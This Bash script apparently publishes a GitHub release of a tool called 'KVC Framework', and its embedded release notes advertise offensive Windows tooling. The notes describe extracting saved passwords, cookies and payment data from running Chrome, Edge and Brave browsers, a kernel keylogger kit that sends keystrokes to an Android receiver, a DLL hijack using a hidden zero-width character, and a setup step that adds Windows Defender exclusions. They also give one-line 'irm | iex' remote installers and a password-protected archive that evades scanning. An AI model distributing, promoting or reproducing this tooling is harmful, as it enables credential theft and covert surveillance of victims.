#!/bin/bash

# Usuwa i odtwarza release 'v1.0.1' z dzisiejszej daty (HEAD).
# Używać gdy chcemy podbić datę taga i Source code bez zmiany wersji.
# Gwiazdki repozytorium NIE są tracone — są na repo, nie na release.

REPO_DIR="/c/Projekty/github/kvc"
REPO="wesmar/kvc"
TAG="v1.0.1"
DATE=$(date +"%d.%m.%Y")

cd "$REPO_DIR" || { echo "❌ Nie można przejść do: $REPO_DIR"; exit 1; }

echo "======================================"
echo "🔧 KROK 1: Pakowanie plików"
echo "======================================"
./pack-data.sh
if [ $? -ne 0 ]; then
    echo "❌ Błąd pakowania!"
    exit 1
fi

SIZE_7Z=$(du -h  "data/kvc.7z"  | cut -f1)
SIZE_ENC=$(du -h "data/kvc.enc" | cut -f1)
SIZE_DAT=$(du -h "data/kvc.dat" | cut -f1)
SIZE_EXE=$(du -h "data/kvc.exe" | cut -f1)

echo ""
echo "======================================"
echo "⬇️  KROK 2: Pobieranie pliku 'run'"
echo "======================================"
gh release download "$TAG" --repo "$REPO" --pattern "run" --output "data/run" --clobber 2>/dev/null
if [ -f "data/run" ]; then
    echo "✅ Pobrano 'run'"
else
    echo "❌ Nie udało się pobrać 'run' — przerywam!"
    exit 1
fi

COMMIT=$(git log --oneline -1)
echo ""
echo "======================================"
echo "📦 kvc.7z   $SIZE_7Z   📦 kvc.enc  $SIZE_ENC"
echo "🎯 Release: $TAG @ $REPO"
echo "🗓️  Data:    $DATE"
echo "🔖 Commit:  $COMMIT"
echo "======================================"
echo ""
echo "⚠️  Usuwa i odtwarza tag '$TAG' (Source code pokaże datę $DATE)."
echo "   Licznik pobrań zostanie wyzerowany."
read -r -p "Kontynuować? [t/N] " confirm
[[ "$confirm" =~ ^[tTyY]$ ]] || { echo "Anulowano."; exit 0; }

echo ""
echo "======================================"
echo "🗑️  KROK 3: Usuwanie release + tag"
echo "======================================"
gh release delete "$TAG" --repo "$REPO" --yes --cleanup-tag 2>/dev/null \
    && echo "✅ Release i tag usunięte" \
    || echo "⚠️  Release nie istniało (pierwsze tworzenie)"

echo ""
echo "======================================"
echo "📤 KROK 4: Tworzenie nowego release"
echo "======================================"

RELEASE_BODY=$(cat <<BODY
# KVC Framework v1.0.1 - Release ${DATE}

## 🔐 PASSWORD: \`github.com\`
### Extract downloaded release with password: \`github.com\`

---

## 📦 ARCHIVE CONTENTS (\`kvc.7z\` — ${SIZE_7Z})

\`\`\`
kvc-v1.0.1/
│
├── kvc.exe              ⭐ Main KVC Framework executable (REQUIRED)  [${SIZE_EXE}]
├── kvc.dat              ⭐ Encrypted PassExtractor module (OPTIONAL)  [${SIZE_DAT}]
│                           Required for: Chrome, Edge, Brave — passwords + cookies
├── README.txt           📄 Installation guide
│
└── other-tools/         🔧 Development & Research Tools (OPTIONAL)
    │
    ├── encoding-tools/  📦 Framework Build Pipeline
    │   ├── implementer.exe  - Steganographic icon builder
    │   ├── KvcXor.exe       - Resource encoder/decoder
    │   ├── kvc.ini          - Icon builder configuration
    │   ├── kvc.sys          - Kernel driver component
    │   ├── ExplorerFrame​.dll - System DLL (with U+200B hijack char)
    │   ├── kvc_orig.ico     - Original icon template
    │   ├── kvc.ico          - Built steganographic icon
    │   ├── kvc_pass.exe     - Password extractor binary
    │   └── kvc_crypt.dll    - Encryption / injection library
    │
    ├── undervolter/     🔋 EFI Undervolting Module
    │   ├── UnderVolter.dat  - Encrypted EFI payload → deploy with: kvc undervolter deploy
    │   ├── Loader.efi       - UEFI loader (replaces BOOTX64.EFI in mode A)
    │   ├── UnderVolter.efi  - Main EFI application (voltage/power MSR writes)
    │   └── UnderVolter.ini  - Per-CPU profile (Intel 2nd–15th gen, auto-selected by CPUID)
    │
    └── keylogger-kit/   ⌨️ Kernel Keylogger Research Tools
        ├── UdpLogger.apk       - Android UDP receiver (1.47 MB)
        ├── kvckbd.sys          - Keyboard hook driver (14 KB)
        ├── kvckbd.bat          - Automated deployment script
        ├── kvckbd_split.c      - Driver source code (79 KB)
        ├── OmniDriver.sys      - Universal kernel access (13 KB)
        ├── MainActivity.kt     - Android app source
        └── UdpLoggerService.kt - Android service source
\`\`\`

---

## 🔗 DOWNLOAD LINKS

| File | Size | Description |
|------|------|-------------|
| [kvc.7z](https://github.com/${REPO}/releases/download/${TAG}/kvc.7z) | ${SIZE_7Z} | Main archive (password: \`github.com\`) |
| [kvc.enc](https://github.com/${REPO}/releases/download/${TAG}/kvc.enc) | ${SIZE_ENC} | Deployment package (used by \`irm\` installer) |
| [run](https://github.com/${REPO}/releases/download/${TAG}/run) | — | PowerShell one-command installer |

---

## 🚀 QUICK INSTALLATION

### One-Line Remote Install:
\`\`\`powershell
irm https://github.com/${REPO}/releases/download/${TAG}/run | iex
\`\`\`
Downloads \`kvc.exe\` + \`kvc.dat\`, runs \`kvc setup\` automatically.

### Mirror:
\`\`\`powershell
irm https://kvc.pl/run | iex
\`\`\`

### Manual:
1. Download \`kvc.7z\`, extract with password \`github.com\`
2. Open elevated Command Prompt (Run as Administrator)
3. Run: \`kvc setup\`

---

## ✅ WHAT'S NEW — ${DATE}

**Browser extraction without closing** — Chrome, Edge, and Brave passwords,
cookies, and payment data are extracted while the browser is running.
The orchestrator kills only the browser's network-service subprocess (which
holds database file locks), not the browser itself. For Edge, a second
network-service kill is issued right before the DLL opens the database,
compensating for Edge restarting its network service faster than Chrome.

**COM Elevation for Edge** — Edge master key decryption now uses
\`IEdgeElevatorFinal\` (CLSID \`{1FCBE96C-1697-43AF-9140-2897C7C69767}\`)
for all data types including passwords. DPAPI is used as fallback only.
Previous split-key strategy (DPAPI for passwords, COM for cookies) removed.

**kvc.dat covers Chrome AND Edge** — \`kvc.dat\` deploys both \`kvc_pass.exe\`
and \`kvc_crypt.dll\` to System32. Required for full extraction (passwords +
cookies + payments) from all Chromium-based browsers.

**Legacy CPU support** — no AVX/YMM instructions. Works on 3rd-gen Intel
Core and older (SSE2 only). Verified with \`dumpbin /disasm | findstr ymm\`.

**Static CRT** — \`kvc_pass.exe\` and \`kvc_crypt.dll\` link C++ runtime
statically (/MT). No \`vcruntime140.dll\` dependency.

**UnderVolter — EFI undervolting module** — \`kvc undervolter deploy\` writes
a custom UEFI application to the EFI System Partition. On boot it applies
Intel voltage/power-limit offsets via MSR writes before the Windows kernel
loads. ESP is accessed via GPT partition GUID using \`FindFirstVolume\` +
\`IOCTL_DISK_GET_PARTITION_INFO_EX\` — no drive-letter assignment or mountvol.
Supports Intel **2nd–15th gen** (Sandy Bridge → Arrow Lake); profile selected
automatically by CPUID at boot. Build: \`KvcXor.exe\` option 6 packs
\`Loader.efi + UnderVolter.efi + UnderVolter.ini → UnderVolter.dat\`.
Full docs and source: https://kvc.pl/repositories/undervolter

---

## 📋 AUTOMATIC SETUP PROCESS (\`kvc setup\`)

1. Moves \`kvc.exe\` to \`C:\\Windows\\System32\`
2. Adds Windows Defender exclusions automatically
3. Extracts kernel driver from steganographic icon resource
4. Deploys PassExtractor if \`kvc.dat\` is present:
   - Decrypts and splits \`kvc.dat\` → \`kvc_pass.exe\` + \`kvc_crypt.dll\`
   - Writes both to \`C:\\Windows\\System32\`
5. Full browser extraction (Chrome, Edge, Brave) available immediately

---

## 📞 CONTACT & SUPPORT

- **Email**: marek@wesolowski.eu.org
- **Website**: https://kvc.pl
- **GitHub**: https://github.com/wesmar/kvc

---

*Release Date: ${DATE}*
*© WESMAR 2026*
BODY
)

gh release create "$TAG" \
    --repo "$REPO" \
    --title "KVC Framework v1.0.1 - Release ${DATE}" \
    --notes "$RELEASE_BODY" \
    "data/kvc.7z#kvc.7z" \
    "data/kvc.enc#kvc.enc" \
    "data/run#run"

if [ $? -eq 0 ]; then
    echo ""
    echo "======================================"
    echo "✅ SUKCES! (${DATE})"
    echo "======================================"
    echo "   https://github.com/$REPO/releases/tag/$TAG"
    echo ""
    echo "📦 Assety:"
    echo "   kvc.7z  — ${SIZE_7Z}  (archiwum, hasło: github.com)"
    echo "   kvc.enc — ${SIZE_ENC}  (deployment package)"
    echo "   run     — (PowerShell installer)"
else
    echo "❌ Błąd tworzenia release!"
    exit 1
fi
